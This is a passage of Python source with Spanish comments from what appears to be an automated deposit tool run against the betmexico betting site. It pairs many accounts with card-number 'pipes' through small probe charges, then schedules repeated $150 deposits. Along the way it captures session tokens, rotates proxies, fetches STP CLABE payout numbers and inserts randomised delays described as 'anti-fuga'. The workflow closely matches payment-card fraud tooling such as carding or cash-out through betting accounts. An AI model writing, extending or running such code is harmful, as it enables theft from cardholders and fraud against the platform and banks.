                            # Obtener CLABE STP para la cuenta casada (sin frenar si falla)
                            clabe_stp = None
                            try:
                                import clabe_fetch
                                from app import DB_PATH  # lazy: auto_deposit se importa desde app (circular)

                                saved_clabes = clabe_fetch.get_saved_clabes(
                                    DB_PATH, account_id
                                )
                                stp_item = next(
                                    (
                                        c
                                        for c in saved_clabes
                                        if c.get("integration") in ("STP", 2, "2")
                                    ),
                                    None,
                                )
                                if stp_item:
                                    clabe_stp = stp_item.get("clabe")
                                else:
                                    # Intentar fetch fresco si tenemos JWT
                                    jwt_token = r.get("jwt")
                                    used_proxy = r.get("used_proxy")
                                    if jwt_token:
                                        fetched_data = await clabe_fetch.fetch_clabes_from_betmexico(
                                            jwt_token, used_proxy
                                        )
                                        clabe_fetch._persist_clabes(
                                            DB_PATH, account_id, email, fetched_data
                                        )
                                        accounts_stp = (
                                            fetched_data.get("accounts") or []
                                        )
                                        stp_acc = next(
                                            (
                                                a
                                                for a in accounts_stp
                                                if str(a.get("integration"))
                                                in ("STP", "2")
                                            ),
                                            None,
                                        )
                                        if stp_acc:
                                            clabe_stp = str(stp_acc.get("account"))
                            except Exception as ex_clabe:
                                logger.warning(
                                    f"[Auto {mission_id}] No se pudo obtener CLABE STP para {email}: {ex_clabe}"
                                )

                            matches.append(
                                {
                                    "account_id": account_id,
                                    "email": email,
                                    "card_pipe": pipe,
                                    "clabe_stp": clabe_stp,
                                    "jwt": r.get("jwt"),
                                    "proxy": r.get("used_proxy"),
                                    "matched_at": time.time(),
                                }
                            )
                            _m_update(
                                mission_id,
                                matches=json.dumps(matches),
                                total_deposited=deposited,
                                total_approved=approved,
                                phase_detail=f"match {email}",
                            )
                            _broadcast_mission(
                                mission_id,
                                "match",
                                user,
                                on_progress=on_progress,
                                email=email,
                                card_tail=f"···{pipe[:6]}",
                                matches_count=len(matches),
                            )
                            break
                        if code in dep.MM_THREEDS_RC:
                            # 3DS → cuenta premium A+ (no es decline) — patrón :2541-2549
                            try:
                                from app import db as _adb

                                with _adb(write=True) as cdb:
                                    cdb.execute(
                                        "UPDATE accounts SET grade='A+' WHERE email=?",
                                        (email,),
                                    )
                            except Exception as ex:
                                logger.error(
                                    f"[Auto {mission_id}] no pude marcar A+ {email}: {ex}"
                                )
                            break  # siguiente tarjeta
                        if code == "RATE_LIMITED":
                            # DEAD instantáneo + aviso SSE (Robert 2026-08-06: ya
                            # no enfriar-y-reintentar, ver dep._mark_rate_limited_dead)
                            dep._mark_rate_limited_dead(email)
                            _broadcast_mission(
                                mission_id,
                                "cooldown",
                                user,
                                on_progress=on_progress,
                                email=email,
                                reason="rate_limited",
                            )
                            break  # siguiente cuenta inmediatamente (0 espera)
                        if dep._mm_is_real_decline(code) or dep._mm_is_ambiguous_charge(
                            code
                        ):
                            failed += 1
                            account_declines += 1
                            break  # siguiente tarjeta (decline real o cargo ambiguo: terminal)
                        if code in dep.MM_DEAD_RC:
                            failed += 1
                            account_declines += 1
                            break  # cuenta muerta — siguiente cuenta
                        if code == "CARD_LOCKED_OTHER_ACCOUNT":
                            # Candado DB (deposits.py) — determinístico, jamás
                            # cambia entre intentos. No es decline de la cuenta:
                            # no cuenta para MM_MAX_ACCOUNT_DECLINES_PER_RUN.
                            failed += 1
                            break  # siguiente tarjeta
                        # TRANSITORIO (nuestro lado) → reintentar el par
                        transient += 1
                        if transient > MATCH_TRANSIENT_RETRIES:
                            failed += 1
                            break
                        await asyncio.sleep(25)
                    if code and (code == "RATE_LIMITED" or code in dep.MM_DEAD_RC):
                        break  # siguiente cuenta inmediatamente
                    # Regla Robert 2026-07-28: 60s SOLO si vamos a reintentar OTRA
                    # tarjeta en la MISMA cuenta (no al salir hacia la siguiente cuenta).
                    has_more_candidates = pipe_idx < len(candidates) - 1
                    if (
                        not matched
                        and code is not None
                        and has_more_candidates
                        and account_declines < MM_MAX_ACCOUNT_DECLINES_PER_RUN
                    ):
                        await asyncio.sleep(dep.MM_COOLDOWN)
                if locked and not matched:
                    _unlock(account_id)  # regla 7: no dejar 4h/perpetuo sin match
                    locked_ids.discard(account_id)
                # Regla Robert 2026-07-28: 5s de respiro entre CUENTAS distintas
                # (no 60s — ese piso es solo para reintentar en la misma cuenta).
                if not _cancelled() and acc_idx < len(accounts_list) - 1:
                    await asyncio.sleep(MM_CROSS_ACCOUNT_GAP)

            if not matches:
                _m_update(
                    mission_id,
                    status="failed" if not cancelled else "cancelled",
                    phase_detail="sin matches"
                    if not cancelled
                    else "cancelada por el operador",
                    total_deposited=deposited,
                    total_approved=approved,
                    total_failed=failed,
                    completed_at=_iso(),
                )
                _broadcast_mission(
                    mission_id,
                    "failed" if not cancelled else "cancelled",
                    user,
                    on_progress=on_progress,
                    reason="sin matches",
                )
                return

            # Si TODOS los matches capturaron sesión, el pool ya no se necesita (regla 9)
            if all(m.get("jwt") for m in matches):
                await _stop_pool(pool, mission_id)
                pool = None

            # ── FASE 1.5 — CONFIRMACIÓN EXPLÍCITA ANTES DE FASE 2 ──────────────
            if confirm_gate and not _cancelled():
                _m_update(
                    mission_id,
                    status="awaiting_confirmation",
                    phase_detail=f"{len(matches)} cuentas casadas — esperando confirmación",
                )
                _broadcast_mission(
                    mission_id,
                    "awaiting_confirmation",
                    user,
                    on_progress=on_progress,
                    matches=len(matches),
                )
                proceed = False
                try:
                    proceed = await confirm_gate(
                        {
                            "mission_id": mission_id,
                            "matches": matches,
                            "amount": amount,
                            "target_count": target_count,
                        }
                    )
                except Exception as ex:
                    logger.warning(f"[Auto {mission_id}] confirm_gate falló: {ex}")
                if not proceed:
                    cancelled = True

            if cancelled:
                _m_update(
                    mission_id,
                    status="completed",
                    phase_detail="detenido por el operador tras matchmaking",
                    total_deposited=deposited,
                    total_approved=approved,
                    total_failed=failed,
                    completed_at=_iso(),
                )
                _broadcast_mission(
                    mission_id,
                    "completed",
                    user,
                    on_progress=on_progress,
                    deposited=deposited,
                    approved=approved,
                    failed=failed,
                    accounts=len(matches),
                    stopped_by_user=True,
                )
                return

            # ── FASE 2 — SCHEDULED por match (N×amount cada 60s, SP-2) ───────
            _m_update(
                mission_id,
                status="scheduling",
                phase_detail=f"{len(matches)} matches — {target_count}×${amount:.0f}/60s",
            )
            _broadcast_mission(
                mission_id,
                "scheduling",
                user,
                on_progress=on_progress,
                matches=len(matches),
            )
            for m in matches:
                if _cancelled():
                    cancelled = True
                    break
                email = m["email"]
                acct = _fetch_account(m["account_id"])
                if not acct:
                    continue
                session_jwt, session_proxy = m.get("jwt"), m.get("proxy")  # regla 2

                # Piso de 45-60s antes del primer depósito de Fase 2 (anti-fuga,
                # handoff 2026-08-05 §2 Área B): evita que el primer depósito de
                # $150 caiga a escasos segundos del probe de $10 en la MISMA
                # cuenta si el operador confirmó rápido el gate.
                elapsed = time.time() - m.get("matched_at", 0)
                floor = random.uniform(45, 60)
                if elapsed < floor:
                    _broadcast_mission(
                        mission_id,
                        "preparing",
                        user,
                        on_progress=on_progress,
                        email=email,
                    )
                    await asyncio.sleep(floor - elapsed)

                completed = 0
                retries = 0
                while completed < target_count:
                    if _cancelled():
                        cancelled = True
                        break
                    r, ok, code = await _attempt(
                        email,
                        acct["password"],
                        m["card_pipe"],
                        amount,
                        session_jwt,
                        session_proxy,
                    )
                    if ok:
                        completed += 1
                        retries = 0
                        deposited += amount
                        approved += 1
                        if session_jwt is None and r.get(
                            "jwt"
                        ):  # SP-2 verbatim (:2475)
                            session_jwt = r.get("jwt")
                            session_proxy = r.get("used_proxy")
                            m["jwt"], m["proxy"] = session_jwt, session_proxy
                            if (
                                all(mm.get("jwt") for mm in matches)
                                and pool is not None
                            ):
                                await _stop_pool(pool, mission_id)
                                pool = None
                        _m_update(
                            mission_id,
                            total_deposited=deposited,
                            total_approved=approved,
                            phase_detail=f"{email} {completed}/{target_count}",
                        )
                        _broadcast_mission(
                            mission_id,
                            "scheduling",
                            user,
                            on_progress=on_progress,
                            email=email,
                            completed=completed,
                            total=target_count,
                        )
                        if completed < target_count:
                            await asyncio.sleep(60)
                        continue
                    # Terminal para ESTA cuenta (no las demás) — misma ley que scheduled
                    if (
                        code == "RATE_LIMITED"
                        or code in dep.MM_THREEDS_RC
                        or dep._mm_is_real_decline(code)
                        or code in dep.MM_DEAD_RC
                        or code == "PENDING_NOT_APPLIED"
                        or code == "CARD_LOCKED_OTHER_ACCOUNT"
                        or dep._mm_is_ambiguous_charge(code)
                    ):
                        if code == "RATE_LIMITED":
                            dep._mark_rate_limited_dead(email)
                        failed += 1
                        _m_update(
                            mission_id,
                            total_failed=failed,
                            phase_detail=f"{email} abortada ({code})",
                        )
                        _broadcast_mission(
                            mission_id,
                            "scheduling",
                            user,
                            on_progress=on_progress,
                            email=email,
                            aborted=code,
                        )
                        break
                    # Transitorio → retry (SCHED_MAX_TRANSIENT_RETRIES=4, backoff 25s)
                    low = str(r.get("error") or "").lower()
                    if session_jwt and (
                        "sesión rechazada" in low
                        or "401" in low
                        or "redirectlogin" in low
                    ):
                        session_jwt = session_proxy = None  # patrón :2594-2605
                        if pool is None:
                            pool = make_pool(cap_key, size=2, workers=1)
                            await pool.start_factory()
                            asyncio.create_task(pool.prefetch(1))
                    retries += 1
                    if retries > dep.SCHED_MAX_TRANSIENT_RETRIES:
                        failed += 1
                        _m_update(
                            mission_id,
                            total_failed=failed,
                            phase_detail=f"{email} sin éxito tras {retries - 1} reintentos",
                        )
                        break
                    await asyncio.sleep(dep.SCHED_RETRY_BACKOFF_SEC)

            # ── FASE 3 — CIERRE ──────────────────────────────────────────────
            final = "cancelled" if cancelled else "completed"
            _m_update(
                mission_id,
                status=final,
                phase_detail=(
                    "cancelada por el operador"
                    if cancelled
                    else f"${deposited:.0f} en {len(matches)} cuentas"
                ),
                total_deposited=deposited,
                total_approved=approved,
                total_failed=failed,
                completed_at=_iso(),
            )
            _broadcast_mission(
                mission_id,
                final,
                user,
                on_progress=on_progress,
                deposited=deposited,
                approved=approved,
                failed=failed,
                accounts=len(matches),
            )
        finally:
            await _stop_pool(pool, mission_id)
            for aid in locked_ids:  # regla 7: la misión no deja cuentas reservadas
                try:
                    _unlock(aid)
                except Exception as e:
                    logger.warning(f"[Auto {mission_id}] unlock {aid} falló: {e}")
